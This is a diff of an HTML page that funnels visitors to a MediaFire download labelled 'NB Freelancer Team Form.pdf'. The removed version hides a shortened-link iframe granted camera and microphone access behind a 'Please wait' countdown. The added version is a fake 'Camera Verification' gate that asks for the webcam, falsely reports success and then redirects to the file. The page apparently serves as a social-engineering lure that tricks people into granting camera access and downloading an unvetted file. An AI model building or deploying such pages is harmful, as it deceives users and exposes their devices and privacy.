@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <title>Please wait...</title>
+  <title>Verification</title>
 
   <style>
     * {
@@ -18,143 +17,162 @@
       align-items: center;
       justify-content: center;
       background: #111827;
-      color: white;
+      color: #fff;
       font-family: Arial, sans-serif;
     }
 
     .box {
-      width: 90%;
-      max-width: 500px;
-      text-align: center;
+      width: 92%;
+      max-width: 450px;
       padding: 30px 20px;
-      border-radius: 18px;
+      text-align: center;
       background: #1f2937;
-      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.35);
+      border-radius: 18px;
     }
 
     h2 {
       margin-top: 0;
     }
 
-    #countdown {
-      font-size: 40px;
-      font-weight: bold;
+    #status {
       margin: 20px 0;
-    }
-
-    iframe {
-      width: 100%;
-      height: 180px;
-      border: 0;
-      border-radius: 12px;
-      margin-top: 10px;
-    }
-
-    .fallback {
-      display: none;
-      margin-top: 20px;
-    }
-
-    button {
-      border: 0;
-      padding: 12px 22px;
+      padding: 14px;
       border-radius: 10px;
-      background: #2563eb;
+      background: #374151;
+    }
+
+    #camera {
+      width: 100%;
+      border-radius: 12px;
+      display: none;
+      background: #000;
+    }
+
+    #continue {
+      display: none;
+      padding: 13px 25px;
+      border: 0;
+      border-radius: 10px;
+      background: #16a34a;
       color: white;
       font-size: 16px;
       cursor: pointer;
-    }
-
-    button:hover {
-      background: #1d4ed8;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="box">
+<div class="box">
 
-    <h2>Please wait...</h2>
+  <h2>Camera Verification</h2>
 
-    <div id="countdown">3</div>
-
-    <p>Loading the next page...</p>
-
-    <!-- Link 1 -->
-    <iframe
-      src="https://rb.gy/wkpsot"
-      allow="camera; microphone"
-      title="Link 1">
-    </iframe>
-
-    <!-- Fallback button -->
-    <div class="fallback" id="fallback">
-
-      <p>
-        If the download page didn't open automatically:
-      </p>
-
-      <button type="button" onclick="openLink2()">
-        Open Download
-      </button>
-
-    </div>
-
+  <div id="status">
+    Checking camera...
   </div>
 
+  <video id="camera" autoplay playsinline muted></video>
 
-  <script>
+  <button id="continue" onclick="goToDownload()">
+    Continue
+  </button>
 
-    // Link 2
-    const link2 =
-      "https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file";
+</div>
 
+<script>
 
-    let seconds = 3;
+const statusBox = document.getElementById("status");
+const camera = document.getElementById("camera");
+const continueButton = document.getElementById("continue");
 
-    const countdown =
-      document.getElementById("countdown");
+let stream = null;
 
-    const fallback =
-      document.getElementById("fallback");
+async function verifyCamera() {
 
+  try {
 
-    // Countdown
-    const timer = setInterval(() => {
-
-      seconds--;
-
-      countdown.textContent = seconds;
-
-
-      if (seconds <= 0) {
-
-        clearInterval(timer);
-
-        openLink2();
-
-      }
-
-    }, 1000);
-
-
-    // Open Link 2
-    function openLink2() {
-
-      window.location.href = link2;
-
-
-      // Show fallback button
-      setTimeout(() => {
-
-        fallback.style.display = "block";
-
-      }, 1500);
-
+    if (!window.isSecureContext) {
+      throw new Error("HTTPS_REQUIRED");
     }
 
-  </script>
+    if (!navigator.mediaDevices ||
+        !navigator.mediaDevices.getUserMedia) {
+      throw new Error("CAMERA_NOT_SUPPORTED");
+    }
+
+    statusBox.textContent =
+      "Please allow camera access...";
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: "user"
+      },
+      audio: false
+    });
+
+    camera.srcObject = stream;
+    camera.style.display = "block";
+
+    statusBox.textContent =
+      "✓ Camera verified successfully.";
+
+    continueButton.style.display =
+      "inline-block";
+
+  }
+
+  catch (error) {
+
+    console.error(error);
+
+    if (error.name === "NotAllowedError") {
+
+      statusBox.textContent =
+        "Camera permission was denied. Please allow Camera permission in your browser settings and reload this page.";
+
+    } else if (error.name === "NotFoundError") {
+
+      statusBox.textContent =
+        "No camera was found on this device.";
+
+    } else if (error.message === "HTTPS_REQUIRED") {
+
+      statusBox.textContent =
+        "This page must be opened using HTTPS.";
+
+    } else {
+
+      statusBox.textContent =
+        "Camera verification failed.";
+
+    }
+  }
+}
+
+
+function goToDownload() {
+
+  if (stream) {
+
+    stream.getTracks().forEach(track => {
+      track.stop();
+    });
+
+  }
+
+  setTimeout(() => {
+
+    window.location.href =
+      "https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file";
+
+  }, 3000);
+
+}
+
+
+window.addEventListener("load", verifyCamera);
+
+</script>
 
 </body>
 </html>
